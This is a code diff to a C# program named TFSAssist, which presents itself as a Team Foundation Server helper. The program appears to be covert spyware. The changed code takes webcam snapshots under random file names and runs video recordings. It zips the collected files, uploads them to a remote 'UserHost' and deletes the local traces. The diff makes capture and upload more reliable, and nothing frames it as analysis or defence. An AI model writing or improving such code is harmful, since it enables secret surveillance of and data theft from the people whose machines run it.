@@ -3,6 +3,7 @@ using System;
 using System.Collections.Generic;
 using System.Device.Location;
 using System.Diagnostics;
+using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
 using System.IO.Compression;
@@ -240,7 +241,7 @@ namespace TFSAssist
             }
         }
 
-        void SendBigFileToCurrentUser(string destinationPath)
+        void SendZipFileToUserHost(string destinationPath)
         {
             if (!IsEnabled)
                 return;
@@ -250,8 +251,14 @@ namespace TFSAssist
                 //await _control.SendBigFileAsync(_control.CurrentUser.Destination, destinationPath);
                 lock (syncSession)
                 {
-                    Task task = _control.SendBigFileAsync(_control.UserHost.Destination, destinationPath);
-                    task.Wait(); // таймаут ставить нельзя т.к. может интеренет тормознутый и надо дождаться до конца
+                    string destinationZip = DoZipFile(destinationPath);
+                    if (destinationZip != null && File.Exists(destinationZip))
+                    {
+                        Task task = _control.SendBigFileAsync(_control.UserHost.Destination, destinationZip);
+                        task.Wait(); // таймаут ставить нельзя т.к. может интеренет тормознутый и надо дождаться до конца
+
+                        File.Delete(destinationZip);
+                    }
                 }
 
                 // очищаем память, т.к. отправляем большой файл
@@ -530,11 +537,15 @@ namespace TFSAssist
                                     break;
                                 }
 
-                                var photo = _aforgeCapture.GetPicture();
-                                if (photo != null)
+                                Task<Bitmap> task = _aforgeCapture.GetPictureAsync();
+                                if (task.Wait(20000))
                                 {
-                                    string photoPath = Path.Combine(projectDirPath, $"{STRING.RandomString(15)}.png");
-                                    photo?.Save(photoPath, ImageFormat.Png);
+                                    var photo = task.Result;
+                                    if (photo != null)
+                                    {
+                                        string photoPath = Path.Combine(projectDirPath, $"{STRING.RandomString(15)}.png");
+                                        photo.Save(photoPath, ImageFormat.Png);
+                                    }
                                 }
 
                                 break;
@@ -581,6 +592,7 @@ namespace TFSAssist
             }
         }
 
+        private object syncSendingFiles = new object();
 
         void SendPreparedFiles(string projectDirPath)
         {
@@ -590,21 +602,16 @@ namespace TFSAssist
             {
                 try
                 {
-                    string destinationZip = DoZipFile(projectDirPath);
-                    if (destinationZip != null && File.Exists(destinationZip))
-                    {
-                        SendBigFileToCurrentUser(destinationZip);
-                        File.Delete(destinationZip);
-                    }
+                    SendZipFileToUserHost(projectDirPath);
                 }
                 catch (Exception ex)
                 {
                     GC.Collect();
                     WriteExLog(ex);
                 }
-
-                DeleteAllFilesInDirectory(projectDirPath);
             }
+
+            DeleteAllFilesInDirectory(projectDirPath);
         }
 
 
@@ -922,7 +929,7 @@ namespace TFSAssist
 
             try
             {
-                _aforgeCapture = new AForgeCapture(MainThread, _aforgeDevices, _encDevices, projectDirPath, 20);
+                _aforgeCapture = new AForgeCapture(MainThread, _aforgeDevices, _encDevices, projectDirPath, 10);
                 _aforgeCapture.OnRecordingCompleted += OnRecordingCompleted;
                 _aforgeCapture.OnUnexpectedError += OnUnexpectedError;
             }
@@ -933,7 +940,7 @@ namespace TFSAssist
 
             try
             {
-                _encoderCapture = new EncoderCapture(MainThread, _aforgeDevices, _encDevices, projectDirPath, 20);
+                _encoderCapture = new EncoderCapture(MainThread, _aforgeDevices, _encDevices, projectDirPath, 60);
                 _encoderCapture.OnRecordingCompleted += OnRecordingCompleted;
             }
             catch (Exception ex)
